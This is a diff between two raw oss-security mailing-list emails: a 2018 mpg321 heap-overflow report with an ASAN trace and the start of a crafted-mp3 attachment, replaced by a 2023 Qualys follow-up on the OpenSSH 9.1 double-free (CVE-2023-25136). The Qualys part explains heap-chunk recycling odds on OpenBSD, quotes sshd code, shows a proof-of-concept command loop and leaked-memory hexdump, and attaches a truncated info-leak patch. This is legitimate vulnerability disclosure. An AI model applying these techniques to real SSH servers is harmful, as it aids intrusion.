@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["9184" "Friday" "7" "December" "2018" "22:16:59" "-0500" "Ren Kimura" "rkx1209dev@gmail.com" "<CALoRt7TAYGsPRWqtDqJ4dyKfV1O634qYfbq9pDU_X1K=A9ONgQ@mail.gmail.com>" "177" "[oss-security] mpg321: Out-of-bounds Write" "^Date:" nil nil "12" "2018120803:16:59" "[oss-security] mpg321: Out-of-bounds Write" (number mark "        rkx1209dev@g Dec  7  177/9184  " thread-indent "\"[oss-security] mpg321: Out-of-bounds Write\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 23900 invoked by uid 550); 8 Dec 2018 13:09:41 -0000
+Received: (qmail 7926 invoked by uid 550); 22 Feb 2023 05:54:54 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,215 +6,397 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 32473 invoked from network); 8 Dec 2018 03:17:23 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=f/67mkpHeKRYdzMZGuaBWKgb/1XdvW5pw8VR3xPsM4c=;
-        b=chmmPajKJAfXV3g4emtsacMSBTtzsIQ709QxtQ6qug7rc4pgPnCZ0A+u1VDcTBHRod
-         2THnksfYiRwiwCn7OmpZiVM6OH8oNS4NZI/0k4TRRT7QfPTArxNxlN5OLQumClZNaFSb
-         GZBhIq0hkM/eEAatRp4vfSon3zmGem8LbWWY9JOCeZXdpBamhutSfAAVJTOq+VpIC4kq
-         HPGCMTRjwviz+uG/UmDfW45X1vKJKcxHbF+ZBKig5HAq7QFfvAmpe4LcNb3DS/4D1WD+
-         5axIpaJ5M+LF5YBC68Aw80Sf1NF96FCsdess01CTPwukChayUpG2CGbMV185SyjZhXm5
-         TJZg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=f/67mkpHeKRYdzMZGuaBWKgb/1XdvW5pw8VR3xPsM4c=;
-        b=U+LxJJ4OBGNKtjtwXd6t5J6/N2sthQzkRwi+MvA+Mp4vLIWy5O3cVIVIPj1UyB/T8H
-         lIStLLnDgzn1Xc+wKm/dwgtFV032Ct4yosGnkUT5E196aoJIkDree0TcogKKNeSm/l6/
-         44AtK3ANZtcGAXk2VDrs9YjeQKrOOPhaIvbjGkzEgGo+8uawDe7JzhxHyUwnEesXJHZa
-         cmYgzH46TA0ZEr1Evbi4dXnO6NCyDVT3dRLMIFwDjYO0yamb9/vKahVWPtWcXWtqbDQr
-         BQDLlxquG9Z8ysbmIJB9zR5cmy2MYkcw7R2WF2tlvtmxrvPg3abavDdHw0Vjqb6P23fK
-         SH2A==
-X-Gm-Message-State: AA+aEWa/q8Zn1+0ThgH6IUOBBsPzuA/Za9AQdg8bYCo1K0hDL6if1UE6
-	nCkL3KNZgQIqVUu6wU0ka+wvjrYojrO8uL+3FxqGDJao
-X-Google-Smtp-Source: AFSGD/W/7wKu9QWAZAQFaq5Ehsj+srvX/OnnPAiaugrFT2BuZh7zoecugSjsdtc2zFAtICYxqguV4TXyBNg4iEClRdg=
-X-Received: by 2002:a9f:2b44:: with SMTP id q4mr1943346uaj.126.1544239031199;
- Fri, 07 Dec 2018 19:17:11 -0800 (PST)
-MIME-Version: 1.0
-Message-ID: <CALoRt7TAYGsPRWqtDqJ4dyKfV1O634qYfbq9pDU_X1K=A9ONgQ@mail.gmail.com>
-Content-Type: multipart/mixed; boundary="000000000000e7bd7d057c7a2a88"
-Date: Fri, 7 Dec 2018 22:16:59 -0500
-From: Ren Kimura <rkx1209dev@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] mpg321: Out-of-bounds Write
-To: oss-security@lists.openwall.com
+Received: (qmail 7903 invoked from network); 22 Feb 2023 05:54:53 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=from : to : subject :
+ date : message-id : references : in-reply-to : content-type :
+ mime-version; s=qualyscom;
+ bh=+Toq6Ugv0rqn8+STOzzxRjk7WUz+vLgvbHpqblYgzdU=;
+ b=roZCBhkM6dS8vXgwy9eCK1+bNuwqehCTXmb0Vv2cZY1l8N/abF+vosilbvYfoXBJpHLG
+ igKPm6/Ibbbh5jRj5zZSvc29QCHBNe6AOUu126q8UawVcMYgV8lV1nNoKrMX+5EjL9hw
+ PJKggBa7LNeqw2K517iSAkTIYbz9mtFkPHxP+NHO0D0VHyMwWl8GlxHAclMe+eGArZd7
+ zpdCLCvWRcgg6niR4RHIqnXUpU53ueNhF3gYDMX5udcoDtMOe19AMov2KzSGrG5Lhg8U
+ Z9mQia63PIXKzVFEG0zJbIgi+qTSZ0UbTkhGpiaRfcWOV18sf55a4rjq7BaipbJXAljT 2w== 
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=lSPvb2Xe4XhTADoldx1E6uK20u5sgSYt9SXiKpCYPi4zVAxE8dFDF8seFVGZK4A3Lr/viFCitOGzErRAOGWuJoyWmmvqTFqHQth+cF5x0+rYUASCMBHGRLqqHAkCDO2Jko478s2qtXyl29po9/gGIN2hxae/k03IxdNL87lChASsnUsHihnVaGfzOkjrYNsSa24rXpR4PZRU6swD9GiMLPNdO8iBN7CyDBF+rIHohA5LLed7alue8RSyRLjJiMXY7aMBsMVV5eJHdt8+6x4Yy6CBbXcnlLGM86wrBZVUHsbgUPPKkePGy3Dm79xESSNtv+rm3mwznvF3RJfm2yaG3w==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=+Toq6Ugv0rqn8+STOzzxRjk7WUz+vLgvbHpqblYgzdU=;
+ b=TzYdrjsghlyg82h3abRPfz5okYKMBMGk+N7H7qz1BSDT3abm066UEofX6WERYMvsuGlrSRXAI5zqmvuxEGV+iz/Y4t5L0e0l2YXd2HKONKo48u1y61JxBDI40UXnBvlTpAbGAaFBi6/c5AWkj5Hg0ewN8gUyDS5+F9RsYW4cjmos9gn4b/x39lKl+/zAitDnRHohpvx8th3GNBOXGGKBBFDnEUEC4vk2Jat45bL3vnxzJ5BXPhBZmrjaqojlIlz8xf+lf0N1LoJrALXkkiZ3WvjREnQ/R7vZErqhUSLzXkftoM9jcPMWTkBUk53mNFghMur9dkNoeQCxRRUaMSNgBQ==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
+ dkim=pass header.d=qualys.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=+Toq6Ugv0rqn8+STOzzxRjk7WUz+vLgvbHpqblYgzdU=;
+ b=i3zJGrJasL2mwynLU06EjmRgnc9EDADH3UwiCNd8F0KwFWvXgGlWpNHmSAycL44Iu5jjA+cNegFcdCdqF0jFkUfEc0G8Fwg0IPJYkndWWzj9RQYYa05lkWTIThLo4TKkaXa4/YpIlRH9ePTGIzazUS6L3mPh6leFHPvT4inhXt9hTWW8u+y7i/4u01b5bZd/WaEC76MfM9uzXJFVOf8LFWkBf8zg58glanH3PpgA57WW6pKtOzTQNtSQHRn/XHqeiz8aLgJ9yvjaDbHNi3dDN7g8D/xUZs4onGcSotURhNnIjl9ANwxPC9AWxnz2ANlqvrmBPWVTH9DiMk/c+TCWXQ==
+From: Qualys Security Advisory <qsa@qualys.com>
+To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
+Thread-Topic: double-free vulnerability in OpenSSH server 9.1 (CVE-2023-25136)
+Thread-Index: AQHZP6MCIrfQwQnS6U23aTWiygrAQK7ahPwA
+Date: Wed, 22 Feb 2023 05:54:36 +0000
+Message-ID: <20230222055430.GA32113@localhost.localdomain>
+References: <20230202130212.GA15689@localhost.localdomain>
+ <20230213120214.GB19824@localhost.localdomain>
+In-Reply-To: <20230213120214.GB19824@localhost.localdomain>
+Accept-Language: en-US
+Content-Language: en-US
+X-MS-Has-Attach: yes
+X-MS-TNEF-Correlator: 
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: SJ0PR06MB6910:EE_|SA1PR06MB8087:EE_
+x-ms-office365-filtering-correlation-id: 025db491-bbf6-48f0-9303-08db14994751
+x-ms-exchange-senderadcheck: 1
+x-ms-exchange-antispam-relay: 0
+x-microsoft-antispam: BCL:0;
+x-microsoft-antispam-message-info: 
+ l/uul0IDJAw1MuL9WdpTJo1ClM/+a024/FuIxywLslrGv+w+InO4IrtQeZMHkZsK8AhZabSe3eGn4pKV5FiW9pKqzulF6q8lMdwNkHHAL3Mypl9YIXPr/wcxVpHbFYipoXl/PpQttI3r7WyuPCwIkKQ0xV0q0MSlW09fpZT/kFq5oqy3jgsGbcgwsr/0VduHJicoPeJD7I4gyI+xro8eezyO92WQ8wmC5X4/nUyG3RkvAWls2d/buOHOOCQgkIj4URH3HtwWTyjWd3NqBDQ98lwsF3p1U+x/yKlrAettUxGBWtHLs7PYbSsB/AeZSMwqilGbgLbao1RHxJVpS6mI2eyg6QMvRHlLgZVD0+4zTO9RUVhrfc8CrEwbZSPTxgTE+9fBZ4ykcDjbUtRBBONsH3S73yn/K8/V8rI65AHh3Rm8ITfzHhNzU2RtZdzMu+YIB/Cx9SAZ5GkxGKyw7yD8vvN0UEcxO9DxjTyTgRZwtQl5lUMvAgLXB64L6PrKKJxHw6ibHCdDi9ujLtZpDs7KGrHgqZSmFXRkweISRFCIZMgQ99u35ImuDgZqd6NmvwPvdTqI2QS1LlF3X93WotH1jpRoWFkYIzVeCc6ve/lKvK4HM/F89d7LTIlujZhFRy5OR4cruvCvSi4H0jG7hPnGPUNRLUmVCQE572oLMYumi4FOP31DKdRu8gv8VdfMaK8CXG0+OV19oxTN1V1HAdJmkVdwOygL57HorTSOYAseK9k=
+x-forefront-antispam-report: 
+ CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230025)(39860400002)(376002)(136003)(346002)(366004)(396003)(451199018)(83380400001)(26005)(316002)(6486002)(71200400001)(9686003)(186003)(1076003)(6506007)(6512007)(55236004)(33656002)(478600001)(8936002)(38100700002)(86362001)(38070700005)(5660300002)(2906002)(91956017)(41300700001)(122000001)(99936003)(6916009)(8676002)(64756008)(66446008)(66476007)(66556008)(66946007)(76116006)(47845001);DIR:OUT;SFP:1102;
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0: 
+ =?us-ascii?Q?FYqKMdrFHqliCmI8PGuCyfV7MYBzMjveF8QaCpmS5eDa+QhO1NaYkjZzkDSH?=
+ =?us-ascii?Q?Y/9n5NNb3bGfpNJXBGhEUxJv7jbALvPM1UYAg/1QOTVPRDriaI+b563GOWWk?=
+ =?us-ascii?Q?eoRBn2W1XuF1JowYocFhjNp9mgXA1C4k906dMGBMQR4lRSFTgMBKDdLIsL6v?=
+ =?us-ascii?Q?3bZa0Ep+1zzLoq3UCQa2vxuq3+pVKDwS5sVkZFeU9zEP4CDc3OPSsbSnw7Uc?=
+ =?us-ascii?Q?G4OwiRcbnTJluvapW+to83scgsrj6kAwwK6U25IgvHF8mwM4aKoia67T/jT8?=
+ =?us-ascii?Q?og1eRd3BMT/bZ8JZBKlZXs6YwoKIv3UtXHupD51UnMrNvrMlHf/UPJSn2Ebm?=
+ =?us-ascii?Q?B6sryIArZH0QF6cQk9r9mIMNehobHLau4feuLd5Vycx6cCKy27QhYT5WN80B?=
+ =?us-ascii?Q?Rl4zLi/wuYAADM6+E9EwTm8Rm5fRIIVZEfVF2Zx9QhxhS9tlFQb6Zow1H9/R?=
+ =?us-ascii?Q?ZDkqeGoXg3xTx2SqQAAR7BBTV97oKNlE6I3jajj1F4mYk0vLkTo9k1xRy6li?=
+ =?us-ascii?Q?CAhO2lVO1ORXV95kdJLeak67KMTkSL/l04GexmfB1sm6bWM2QG02YwA36q49?=
+ =?us-ascii?Q?v5UNqHEQPwbk3aT9RuR4t2PduMPc9mCcENEFN30gMheZ8QRPzQm1jCcYxmiT?=
+ =?us-ascii?Q?kgXHmDuDg/vocUT2g2nilUYxr2LT+LwjiAgFVv2tMHjn02vhVHdQREc811Sj?=
+ =?us-ascii?Q?YdMGjv/XHmwwvdHOHZypdyWdpbCrPzDC33aTYJysRIHfmW1C6oh+drBY91jR?=
+ =?us-ascii?Q?Wz0bIpGUYjToYlrXZhsPFloe2PUoNdcuX6LtYDlezwhLBY9HfPlKYETOCTpE?=
+ =?us-ascii?Q?BSusQRuIktOn7efuo7dqQu5mDIyA7auB5ONB6G7c3mv+TF3gCSiAoYOY78Ik?=
+ =?us-ascii?Q?Ya4yPdamiolmDevEu5uyS9d+kmFGuiQ3ccwWL9Vja9JcljFpTAzq2rGTfxwo?=
+ =?us-ascii?Q?HYARk7+0xmhbwiO7+FW7trtxhffVzgB8NG2XjUXaIB+kIbwekHQVTVkbPkdt?=
+ =?us-ascii?Q?CaV8wqAl+TAF6JIRH6lhjj2nlwjZ+2o86UXs9ya+YvHyF7T/sGurPir0jFnc?=
+ =?us-ascii?Q?8e9s/W9ixy9j5H0uUgjLn/Ws8ZPLTezFK/ehiyzVYblOUAqnXFEfmhJHj/vN?=
+ =?us-ascii?Q?RohlltAxvZuPlPwkMJYHylHa9tOJbgQSP8nRV2a0uctPloo3CS9C4ZYmgI6L?=
+ =?us-ascii?Q?eeu5dWyJKBYvqABenSN5TeNqgDbGBLFGeMWMr1qz+SUcZZkcEg+b8i71X2eM?=
+ =?us-ascii?Q?pAV1zZDe8dM4/klmpaAEv65ZKmo0j3yjlhMfLEsHxlGKpC2bc+AYm9olkkqg?=
+ =?us-ascii?Q?MCjlT29ROVFu9Yh5gckQiu5uoUxX3/9ZpXJNxO0yhqg/J2TC1/mM+pOW43B/?=
+ =?us-ascii?Q?pkKTHPHFVnfwfdaDLYTg+CvPRfW49b9nDymbzX6euePk5Z2vNQ3SQR+XFxde?=
+ =?us-ascii?Q?MDVEnv5gkoMqqLLi77hS+tExqVIwMk6ZKzrrn9W/dPWcw9tlUAsdPXPGntAt?=
+ =?us-ascii?Q?SNZNY/tHpsmArsb7BZkTK6OZzwtzFhR0REggOq0qZuntRcSgBQzL2AHAMmvE?=
+ =?us-ascii?Q?t8aBPRTmx//j/+j56svM3HgEG++McHmaIzzj9Y0y9lhArP+qKZb0dzj8Nltd?=
+ =?us-ascii?Q?wrUC87teL/JXo4k1LLwijRo=3D?=
+Content-Type: multipart/mixed;
+	boundary="_002_20230222055430GA32113localhostlocaldomain_"
+MIME-Version: 1.0
+X-OriginatorOrg: qualys.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: SJ0PR06MB6910.namprd06.prod.outlook.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: 025db491-bbf6-48f0-9303-08db14994751
+X-MS-Exchange-CrossTenant-originalarrivaltime: 22 Feb 2023 05:54:36.1657
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
+X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
+X-MS-Exchange-CrossTenant-userprincipalname: 6HG59wjUnU2ou2VUKlr/cMYf5NIUVK0rDcoSGM6j4jD71WkRGn8FQ3U0XiMxaLIr/WYBG2hO9pILSbNDYzpYq6rlH/X9LBikufoUdv7Zm6o=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: SA1PR06MB8087
+X-Proofpoint-Virus-Version: vendor=baseguard
+ engine=ICAP:2.0.205,Aquarius:18.0.930,Hydra:6.0.562,FMLib:17.11.170.22
+ definitions=2023-02-22_02,2023-02-20_02,2023-02-09_01
+Subject: [oss-security] Re: double-free vulnerability in OpenSSH server 9.1 (CVE-2023-25136)
 
---000000000000e7bd7d057c7a2a88
-Content-Type: text/plain; charset="UTF-8"
+--_002_20230222055430GA32113localhostlocaldomain_
+Content-Type: text/plain; charset="us-ascii"
+Content-ID: <C8BF6BEA1570FB4196DB6D60178590E5@namprd06.prod.outlook.com>
+Content-Transfer-Encoding: quoted-printable
 
-Hi.
-mpg321 is a free command-line mp3 player that is commonly available on
-many Linux distributions.
-For example, in ubuntu you can download the latest mpg321 by "apt-get
-install mpg321."
+Hi all,
 
-latest mpg321 0.3.2, in scan() in mad.c calculate the number of frames
-using bit rate.
-If crafted mp3 whose bit rate equal 0 is taken, sampling time become
-INF value due to floating point division by 0.
-As a result, the frame number become a very large (1<<63), leading out
-of bounds write, memory corruption at mad.c:285.
-note. frames buffer have been allocated only 8-byte at mpg321.c:990.
+Another quick update on the exploitation of this double-free bug on
+OpenBSD:
 
-I'll request a CVE ID from MITRE.
+a/ our previous attack (the arbitrary control of sshd's instruction
+pointer via the EVP_AES_KEY structure) works only on OpenBSD amd64, not
+on OpenBSD i386;
 
-ASAN crash traces:
+b/ we were able to recycle the chunk of memory where
+options.kex_algorithms was allocated, into a chunk of a different size
+(which gives us greater freedom), but this happens with such a low
+probability (even on i386) that we do not consider this particular
+attack to be practical;
 
-Playing MPEG stream from mpg321_0.3.2_memory_corruption.mp3 ...
-=================================================================
-==18648==ERROR: AddressSanitizer: heap-buffer-overflow on address
-0x6020000000d8 at pc 0x555555566c18 bp 0x7fffffffb3$
-0 sp 0x7fffffffb3c0
-WRITE of size 8 at 0x6020000000d8 thread T0
-    #0 0x555555566c17 in read_header
-/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mad.c:285
-    #1 0x7ffff64c0594  (/usr/lib/x86_64-linux-gnu/libmad.so.0+0x5594)
-    #2 0x7ffff64c0b82 in mad_decoder_run
-(/usr/lib/x86_64-linux-gnu/libmad.so.0+0x5b82)
-    #3 0x5555555607fb in main
-/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mpg321.c:1092
-    #4 0x7ffff5b43b96 in __libc_start_main
-(/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
-    #5 0x555555562779 in _start
-(/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mpg321-asan+0xe779)
+c/ as a direct consequence of CVE-2023-25136, we found an information
+leak (of bits and pieces from the memory of the unprivileged sshd
+process), but it is unlikely to be useful in practice.
 
-0x6020000000d8 is located 0 bytes to
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+a/ Our previous attack, on OpenBSD i386.
 
-0x6020000000d8 is located 0 bytes to the right of 8-byte region
-[0x6020000000d0,0x6020000000d8)
-allocated by thread T0 here:
-    #0 0x7ffff6ef8b50 in __interceptor_malloc
-(/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
-    #1 0x555555561b51 in main
-/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mpg321.c:990
+options.kex_algorithms is a 266-byte string, which occupies a 512-byte
+chunk of memory. On OpenBSD amd64, we can re-allocate this chunk (after
+it is freed for the first time) with a struct EVP_AES_KEY, whose size is
+264 bytes and therefore also requires a 512-byte chunk of memory.
 
-SUMMARY: AddressSanitizer: heap-buffer-overflow
-/home/rkx/Programming/OSS/research/results/2/mpg321-0.3.2/mad.c:285 in
- read_header
-Shadow bytes around the buggy address:
-  0x0c047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c047fff8000: fa fa 06 fa fa fa 06 fa fa fa 01 fa fa fa 00 00
-=>0x0c047fff8010: fa fa 00 00 fa fa 06 fa fa fa 00[fa]fa fa 00 00
-  0x0c047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-Shadow byte legend (one shadow byte represents 8 application bytes):
-  Addressable:           00
-  Partially addressable: 01 02 03 04 05 06 07
-  Heap left redzone:       fa
+But on OpenBSD i386, the size of a struct EVP_AES_KEY is only 252 bytes,
+and it therefore requires a 256-byte chunk instead; i.e., we cannot
+easily re-allocate options.kex_algorithms's chunk with a struct
+EVP_AES_KEY.
 
-Ren Kimura
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+b/ The recycling of options.kex_algorithms's chunk.
 
---000000000000e7bd7d057c7a2a88
-Content-Type: audio/mp3; name="mpg321_0.3.2_memory_corruption.mp3"
-Content-Disposition: attachment; 
-	filename="mpg321_0.3.2_memory_corruption.mp3"
+One solution to the previous problem (on OpenBSD i386) is to recycle
+options.kex_algorithms's 512-byte chunk, into a 256-byte chunk; i.e.,
+recycle the page of memory where options.kex_algorithms was allocated,
+into a page of 256-byte chunks instead. To achieve this:
+
+- options.kex_algorithms must be allocated in an otherwise empty page
+  of memory (so that, after options.kex_algorithms is freed, this empty
+  page can be re-used for chunks of a different size). Luckily, because
+  options.kex_algorithms is allocated randomly from several pages of
+  memory, this does happen from time to time, with a probability of
+  ~1/512 in our tests.
+
+- This empty page must then be re-used for chunks of a different size,
+  but sshd enables malloc's "secure" mode (malloc_options =3D "S"): empty
+  pages are not cached by malloc but are immediately munmap()ed, and the
+  re-mmap()ing of a page at the exact same address is therefore subject
+  to AS(L)R. This happens with a probability of ~1/2^18 at best (unlike
+  Linux, OpenBSD randomizes every single mmap() address, in a 1GB range
+  on i386).
+
+- Inside this recycled page, our target chunk must be allocated exactly
+  where options.kex_algorithms was allocated. For a 256-byte target
+  chunk, this happens with a probability of 1/16.
+
+As a result, the probability of recycling options.kex_algorithms's chunk
+into a 256-byte chunk is ~1/2^31 at best, so we do not consider this
+particular attack to be practical.
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+c/ A useless (?) information leak.
+
+After options.kex_algorithms's chunk is freed for the first time (in
+compat_kex_proposal()), sshd enters input_userauth_request():
+
+------------------------------------------------------------------------
+250 static int
+251 input_userauth_request(int type, u_int32_t seq, struct ssh *ssh)
+252 {
+...
+262         if ((r =3D sshpkt_get_cstring(ssh, &user, NULL)) !=3D 0 ||
+263             (r =3D sshpkt_get_cstring(ssh, &service, NULL)) !=3D 0 ||
+264             (r =3D sshpkt_get_cstring(ssh, &method, NULL)) !=3D 0)
+265                 goto out;
+...
+274         if (authctxt->attempt++ =3D=3D 0) {
+275                 /* setup auth context */
+276                 authctxt->pw =3D PRIVSEP(getpwnamallow(ssh, user));
+...
+289                 authctxt->user =3D xstrdup(user);
+290                 authctxt->service =3D xstrdup(service);
+...
+298         } else if (strcmp(user, authctxt->user) !=3D 0 ||
+299             strcmp(service, authctxt->service) !=3D 0) {
+300                 ssh_packet_disconnect(ssh, "Change of username or servi=
+ce "
+301                     "not allowed: (%s,%s) -> (%s,%s)",
+302                     authctxt->user, authctxt->service, user, service);
+303         }
+...
+328  out:
+329         free(service);
+330         free(user);
+331         free(method);
+332         return r;
+333 }
+------------------------------------------------------------------------
+
+- at lines 262-264, we re-allocate options.kex_algorithms's chunk with
+  our user, service, or method string (a 300-byte string, which requires
+  a 512-byte chunk, just like options.kex_algorithms);
+
+- at line 276, options.kex_algorithms's chunk (now our user, service, or
+  method string) is freed again;
+
+- at lines 289-290, we re-allocate options.kex_algorithms's chunk again,
+  with either authctxt->user or authctxt->service (a copy of our user or
+  service string);
+
+- at lines 329-331, options.kex_algorithms's chunk (now authctxt->user
+  or authctxt->service) is freed again (via user, service, or method);
+
+- when sshd enters input_userauth_request() for the second time, either
+  user or service does not match (at lines 298-299), and the contents of
+  the free authctxt->user or authctxt->service chunk is sent to us (at
+  lines 300-302).
+
+Initially, we thought that this information leak would not leak any
+information at all, because OpenBSD's malloc (when in "secure" mode)
+overwrites the contents of free chunks with 0xdf bytes. Nevertheless,
+because the authctxt->user or authctxt->service chunk is sent to us as a
+null-terminated string (%s), and because this chunk does not contain any
+null bytes (only 0xdf bytes), the chunk that follows authctxt->user or
+authctxt->service is also sent to us, and might contain interesting
+pieces of information (because it can be an allocated chunk).
+
+Our proof of concept (a simple patch for openssh-9.1p1) is attached to
+this email. We have not fully analyzed its output yet (disconnect.log),
+but we do not expect it to be particularly useful, because of sshd's
+defense-in-depth mechanisms:
+
+- the memory of the unprivileged sshd process (where the information
+  leak occurs) is not supposed to contain any secret information (for
+  example, the private host keys are scrubbed from the memory of the
+  unprivileged sshd process as soon as it is fork()ed, in
+  demote_sensitive_data());
+
+- any leaked memory address is mostly useless (except maybe for its
+  least significant bits), because sshd calls _exit() at the end of
+  ssh_packet_disconnect() (at lines 300-302), and because sshd fork()s
+  and re-execv()s itself (and therefore re-randomizes its address space)
+  every time it accept()s a new client connection.
+
+As an example, below is an excerpt from a disconnect.log that was
+produced when running our proof of concept against an unpatched OpenBSD
+7.2 (on amd64):
+
+------------------------------------------------------------------------
+$ while true ;do ./ssh invalid@192.168.56.123 ;done
+...
+
+$ hexdump -C disconnect.log
+...
+000280d0  00 43 68 61 6e 67 65 20  6f 66 20 75 73 65 72 6e  |.Change of use=
+rn|
+000280e0  61 6d 65 20 6f 72 20 73  65 72 76 69 63 65 20 6e  |ame or service=
+ n|
+000280f0  6f 74 20 61 6c 6c 6f 77  65 64 3a 20 28 df df df  |ot allowed: (.=
+..|
+00028100  df df df df df df df df  df df df df df df df df  |..............=
+..|
+*
+000282f0  df df df df df df df df  df df df df df 29 4e 90  |.............)=
+N.|
+00028300  92 98 14 ff b0 35 d4 f8  f8 59 db 0a ba 43 99 95  |.....5...Y...C=
+..|
+00028310  70 6d 2d 2a 5e 85 fe 22  ff 1c 92 19 3b 4e 6d 58  |pm-*^.."....;N=
+mX|
+00028320  4b 82 2f bd 97 1e 8c 0d  ab 61 4f 76 9b 4b c2 6b  |K./......aOv.K=
+.k|
+00028330  91 f1 25 c5 5e c2 12 79  d5 a9 56 7f 10 18 e2 71  |..%.^..y..V...=
+.q|
+00028340  f5 0c c7 9c d0 08 61 82  18 36 66 eb cf af d0 60  |......a..6f...=
+.`|
+00028350  e9 e0 af 86 5d 07 2c df  df df df df df df df df  |....].,.......=
+..|
+00028360  df df df df df df df df  df df df df df df df df  |..............=
+..|
+...
+------------------------------------------------------------------------
+
+We are at your disposal for questions, comments, and further
+discussions. Thank you very much!
+
+With best regards,
+
+--=20
+the Qualys Security Advisory team
+
+--_002_20230222055430GA32113localhostlocaldomain_
+Content-Type: text/plain; name="infoleak.patch"
+Content-Description: infoleak.patch
+Content-Disposition: attachment; filename="infoleak.patch"; size=3639;
+	creation-date="Wed, 22 Feb 2023 05:54:36 GMT";
+	modification-date="Wed, 22 Feb 2023 05:54:36 GMT"
+Content-ID: <7399ACEE210A9F4CA8DFBF5DF80332F2@namprd06.prod.outlook.com>
 Content-Transfer-Encoding: base64
-Content-ID: <f_jpeumh520>
-X-Attachment-Id: f_jpeumh520
 
-M/JywE8nABhgngYVSXgAUZQIC2M5/CCBBELhgkTJ5AIFAxEgEyDFxWK3hQNW
